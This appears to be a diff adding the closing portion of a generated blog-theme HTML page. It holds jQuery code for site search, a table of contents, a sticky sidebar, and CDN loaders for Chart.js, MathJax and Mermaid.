+      search.getVal = function() {
+        return $searchInput.val();
+      };
+      search.setVal = function(val) {
+        $searchInput.val(val);
+      };
+
+      $searchInput.on('focus', function() {
+        $(this).addClass('focus');
+      });
+      $searchInput.on('blur', function() {
+        $(this).removeClass('focus');
+      });
+      $searchInput.on('input', window.throttle(function() {
+        var val = $(this).val();
+        if (val === '' || typeof val !== 'string') {
+          search.clear && search.clear();
+        } else {
+          $searchBox.addClass('not-empty');
+          search.onInputNotEmpty && search.onInputNotEmpty(val);
+        }
+      }, 400));
+      $searchClear.on('click', function() {
+        $searchInput.val(''); $searchBox.removeClass('not-empty');
+        search.clear && search.clear();
+      });
+    }
+  });
+})();
+</script><div class="search search--dark">
+  <div class="main">
+    <div class="search__header">Search</div>
+    <div class="search-bar">
+      <div class="search-box js-search-box">
+        <div class="search-box__icon-search"><i class="fas fa-search"></i></div>
+        <input type="text" />
+        <div class="search-box__icon-clear js-icon-clear">
+          <a><i class="fas fa-times"></i></a>
+        </div>
+      </div>
+      <button class="button button--theme-dark button--pill search__cancel js-search-toggle">
+        Cancel</button>
+    </div>
+    <div class="search-result js-search-result"></div>
+  </div>
+</div>
+<script>var SOURCES = window.TEXT_VARIABLES.sources;
+var PAHTS = window.TEXT_VARIABLES.paths;
+window.Lazyload.js([SOURCES.jquery, PAHTS.search_js], function() {
+  var search = (window.search || (window.search = {}));
+  var searchData = window.TEXT_SEARCH_DATA || {};
+
+  function memorize(f) {
+    var cache = {};
+    return function () {
+      var key = Array.prototype.join.call(arguments, ',');
+      if (key in cache) return cache[key];
+      else return cache[key] = f.apply(this, arguments);
+    };
+  }
+
+  /// search
+  function searchByQuery(query) {
+    var i, j, key, keys, cur, _title, result = {};
+    keys = Object.keys(searchData);
+    for (i = 0; i < keys.length; i++) {
+      key = keys[i];
+      for (j = 0; j < searchData[key].length; j++) {
+        cur = searchData[key][j], _title = cur.title;
+        if ((result[key] === undefined || result[key] && result[key].length < 4 )
+          && _title.toLowerCase().indexOf(query.toLowerCase()) >= 0) {
+          if (result[key] === undefined) {
+            result[key] = [];
+          }
+          result[key].push(cur);
+        }
+      }
+    }
+    return result;
+  }
+
+  var renderHeader = memorize(function(header) {
+    return $('<p class="search-result__header">' + header + '</p>');
+  });
+
+  var renderItem = function(index, title, url) {
+    return $('<li class="search-result__item" data-index="' + index + '"><a class="button" href="' + url + '">' + title + '</a></li>');
+  };
+
+  function render(data) {
+    if (!data) { return null; }
+    var $root = $('<ul></ul>'), i, j, key, keys, cur, itemIndex = 0;
+    keys = Object.keys(data);
+    for (i = 0; i < keys.length; i++) {
+      key = keys[i];
+      $root.append(renderHeader(key));
+      for (j = 0; j < data[key].length; j++) {
+        cur = data[key][j];
+        $root.append(renderItem(itemIndex++, cur.title, cur.url));
+      }
+    }
+    return $root;
+  }
+
+  // search box
+  var $result = $('.js-search-result'), $resultItems;
+  var lastActiveIndex, activeIndex;
+
+  function clear() {
+    $result.html(null);
+    $resultItems = $('.search-result__item'); activeIndex = 0;
+  }
+  function onInputNotEmpty(val) {
+    $result.html(render(searchByQuery(val)));
+    $resultItems = $('.search-result__item'); activeIndex = 0;
+    $resultItems.eq(0).addClass('active');
+  }
+
+  search.clear = clear;
+  search.onInputNotEmpty = onInputNotEmpty;
+
+  function updateResultItems() {
+    lastActiveIndex >= 0 && $resultItems.eq(lastActiveIndex).removeClass('active');
+    activeIndex >= 0 && $resultItems.eq(activeIndex).addClass('active');
+  }
+
+  function moveActiveIndex(direction) {
+    var itemsCount = $resultItems ? $resultItems.length : 0;
+    if (itemsCount > 1) {
+      lastActiveIndex = activeIndex;
+      if (direction === 'up') {
+        activeIndex = (activeIndex - 1 + itemsCount) % itemsCount;
+      } else if (direction === 'down') {
+        activeIndex = (activeIndex + 1 + itemsCount) % itemsCount;
+      }
+      updateResultItems();
+    }
+  }
+
+  // Char Code: 13  Enter, 37  ⬅, 38  ⬆, 39  ➡, 40  ⬇
+  $(window).on('keyup', function(e) {
+    var modalVisible = search.getModalVisible && search.getModalVisible();
+    if (modalVisible) {
+      if (e.which === 38) {
+        modalVisible && moveActiveIndex('up');
+      } else if (e.which === 40) {
+        modalVisible && moveActiveIndex('down');
+      } else if (e.which === 13) {
+        modalVisible && $resultItems && activeIndex >= 0 && $resultItems.eq(activeIndex).children('a')[0].click();
+      }
+    }
+  });
+
+  $result.on('mouseover', '.search-result__item > a', function() {
+    var itemIndex = $(this).parent().data('index');
+    itemIndex >= 0 && (lastActiveIndex = activeIndex, activeIndex = itemIndex, updateResultItems());
+  });
+});
+</script>
+</div></div>
+
+
+<script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function scrollToAnchor(anchor, duration, callback) {
+      var $root = this;
+      $root.animate({ scrollTop: $(anchor).position().top }, duration, function() {
+        window.history.replaceState(null, '', window.location.href.split('#')[0] + anchor);
+        callback && callback();
+      });
+    }
+    $.fn.scrollToAnchor = scrollToAnchor;
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function affix(options) {
+      var $root = this, $window = $(window), $scrollTarget, $scroll,
+        offsetBottom = 0, scrollTarget = window, scroll = window.document, disabled = false, isOverallScroller = true,
+        rootTop, rootLeft, rootHeight, scrollBottom, rootBottomTop,
+        hasInit = false, curState;
+
+      function setOptions(options) {
+        var _options = options || {};
+        _options.offsetBottom && (offsetBottom = _options.offsetBottom);
+        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
+        _options.scroll && (scroll = _options.scroll);
+        _options.disabled !== undefined && (disabled = _options.disabled);
+        $scrollTarget = $(scrollTarget);
+        isOverallScroller = window.isOverallScroller($scrollTarget[0]);
+        $scroll = $(scroll);
+      }
+      function preCalc() {
+        top();
+        rootHeight = $root.outerHeight();
+        rootTop = $root.offset().top + (isOverallScroller ? 0 :  $scrollTarget.scrollTop());
+        rootLeft = $root.offset().left;
+      }
+      function calc(needPreCalc) {
+        needPreCalc && preCalc();
+        scrollBottom = $scroll.outerHeight() - offsetBottom - rootHeight;
+        rootBottomTop = scrollBottom - rootTop;
+      }
+      function top() {
+        if (curState !== 'top') {
+          $root.removeClass('fixed').css({
+            left: 0,
+            top: 0
+          });
+          curState = 'top';
+        }
+      }
+      function fixed() {
+        if (curState !== 'fixed') {
+          $root.addClass('fixed').css({
+            left: rootLeft + 'px',
+            top: 0
+          });
+          curState = 'fixed';
+        }
+      }
+      function bottom() {
+        if (curState !== 'bottom') {
+          $root.removeClass('fixed').css({
+            left: 0,
+            top: rootBottomTop + 'px'
+          });
+          curState = 'bottom';
+        }
+      }
+      function setState() {
+        var scrollTop = $scrollTarget.scrollTop();
+        if (scrollTop >= rootTop && scrollTop <= scrollBottom) {
+          fixed();
+        } else if (scrollTop < rootTop) {
+          top();
+        } else {
+          bottom();
+        }
+      }
+      function init() {
+        if(!hasInit) {
+          var interval, timeout;
+          calc(true); setState();
+          // run calc every 100 millisecond
+          interval = setInterval(function() {
+            calc();
+          }, 100);
+          timeout = setTimeout(function() {
+            clearInterval(interval);
+          }, 45000);
+          window.pageLoad.then(function() {
+            setTimeout(function() {
+              clearInterval(interval);
+              clearTimeout(timeout);
+            }, 3000);
+          });
+          $scrollTarget.on('scroll', function() {
+            disabled || setState();
+          });
+          $window.on('resize', function() {
+            disabled || (calc(true), setState());
+          });
+          hasInit = true;
+        }
+      }
+
+      setOptions(options);
+      if (!disabled) {
+        init();
+      }
+      $window.on('resize', window.throttle(function() {
+        init();
+      }, 200));
+      return {
+        setOptions: setOptions,
+        refresh: function() {
+          calc(true, { animation: false }); setState();
+        }
+      };
+    }
+    $.fn.affix = affix;
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    function toc(options) {
+      var $root = this, $window = $(window), $scrollTarget, $scroller, $tocUl = $('<ul class="toc toc--ellipsis"></ul>'), $tocLi, $headings, $activeLast, $activeCur,
+        selectors = 'h1,h2,h3', container = 'body', scrollTarget = window, scroller = 'html, body', disabled = false,
+        headingsPos, scrolling = false, hasRendered = false, hasInit = false;
+
+      function setOptions(options) {
+        var _options = options || {};
+        _options.selectors && (selectors = _options.selectors);
+        _options.container && (container = _options.container);
+        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
+        _options.scroller && (scroller = _options.scroller);
+        _options.disabled !== undefined && (disabled = _options.disabled);
+        $headings = $(container).find(selectors).filter('[id]');
+        $scrollTarget = $(scrollTarget);
+        $scroller = $(scroller);
+      }
+      function calc() {
+        headingsPos = [];
+        $headings.each(function() {
+          headingsPos.push(Math.floor($(this).position().top));
+        });
+      }
+      function setState(element, disabled) {
+        var scrollTop = $scrollTarget.scrollTop(), i;
+        if (disabled || !headingsPos || headingsPos.length < 1) { return; }
+        if (element) {
+          $activeCur = element;
+        } else {
+          for (i = 0; i < headingsPos.length; i++) {
+            if (scrollTop >= headingsPos[i]) {
+              $activeCur = $tocLi.eq(i);
+            } else {
+              $activeCur || ($activeCur = $tocLi.eq(i));
+              break;
+            }
+          }
+        }
+        $activeLast && $activeLast.removeClass('active');
+        ($activeLast = $activeCur).addClass('active');
+      }
+      function render() {
+        if(!hasRendered) {
+          $root.append($tocUl);
+          $headings.each(function() {
+            var $this = $(this);
+            $tocUl.append($('<li></li>').addClass('toc-' + $this.prop('tagName').toLowerCase())
+              .append($('<a></a>').text($this.text()).attr('href', '#' + $this.prop('id'))));
+          });
+          $tocLi = $tocUl.children('li');
+          $tocUl.on('click', 'a', function(e) {
+            e.preventDefault();
+            var $this = $(this);
+            scrolling = true;
+            setState($this.parent());
+            $scroller.scrollToAnchor($this.attr('href'), 400, function() {
+              scrolling = false;
+            });
+          });
+        }
+        hasRendered = true;
+      }
+      function init() {
+        var interval, timeout;
+        if(!hasInit) {
+          render(); calc(); setState(null, scrolling);
+          // run calc every 100 millisecond
+          interval = setInterval(function() {
+            calc();
+          }, 100);
+          timeout = setTimeout(function() {
+            clearInterval(interval);
+          }, 45000);
+          window.pageLoad.then(function() {
+            setTimeout(function() {
+              clearInterval(interval);
+              clearTimeout(timeout);
+            }, 3000);
+          });
+          $scrollTarget.on('scroll', function() {
+            disabled || setState(null, scrolling);
+          });
+          $window.on('resize', window.throttle(function() {
+            if (!disabled) {
+              render(); calc(); setState(null, scrolling);
+            }
+          }, 100));
+        }
+        hasInit = true;
+      }
+
+      setOptions(options);
+      if (!disabled) {
+        init();
+      }
+      $window.on('resize', window.throttle(function() {
+        init();
+      }, 200));
+      return {
+        setOptions: setOptions
+      };
+    }
+    $.fn.toc = toc;
+  });
+})();
+/*(function () {
+
+})();*/
+</script><script>
+  /* toc must before affix, since affix need to konw toc' height. */(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  var TOC_SELECTOR = window.TEXT_VARIABLES.site.toc.selectors;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window);
+    var $articleContent = $('.js-article-content');
+    var $tocRoot = $('.js-toc-root'), $col2 = $('.js-col-aside');
+    var toc;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+    var hasToc = $articleContent.find(TOC_SELECTOR).length > 0;
+
+    function disabled() {
+      return $col2.css('display') === 'none' || !hasToc;
+    }
+
+    tocDisabled = disabled();
+
+    toc = $tocRoot.toc({
+      selectors: TOC_SELECTOR,
+      container: $articleContent,
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      tocDisabled = disabled();
+      toc && toc.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window), $pageFooter = $('.js-page-footer');
+    var $pageAside = $('.js-page-aside');
+    var affix;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+
+    affix = $pageAside.affix({
+      offsetBottom: $pageFooter.outerHeight(),
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      scroll: hasSidebar ? $('.js-page-main').children() : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      affix && affix.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+    window.pageAsideAffix = affix;
+  });
+})();
+</script><script>
+  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js'], function() {
+    var $canvas = null, $this = null, _ctx = null, _text = '';
+    $('.language-chart').each(function(){
+      $this = $(this);
+      $canvas = $('<canvas></canvas>');
+      _text = $this.text();
+      $this.text('').append($canvas);
+      _ctx = $canvas.get(0).getContext('2d');
+      (_ctx && _text) && (new Chart(_ctx, JSON.parse(_text)) && $this.attr('data-processed', true));
+    });
+  });
+</script>
+<script type="text/x-mathjax-config">
+	var _config = { tex2jax: {
+		inlineMath: [['$','$'], ['\\(','\\)']]
+	}};_config.TeX = { equationNumbers: { autoNumber: "all" } };MathJax.Hub.Config(_config);
+</script>
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  window.Lazyload.js('https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js', function() {
+    mermaid.initialize({
+      startOnLoad: true
+    });
+    mermaid.init(undefined, '.language-mermaid');
+  });
+</script>
+
+    </div>
+    <script>(function () {
+  var $root = document.getElementsByClassName('root')[0];
+  if (window.hasEvent('touchstart')) {
+    $root.dataset.isTouch = true;
+    document.addEventListener('touchstart', function(){}, false);
+  }
+})();
+</script>
+  </body>
+</html>
+
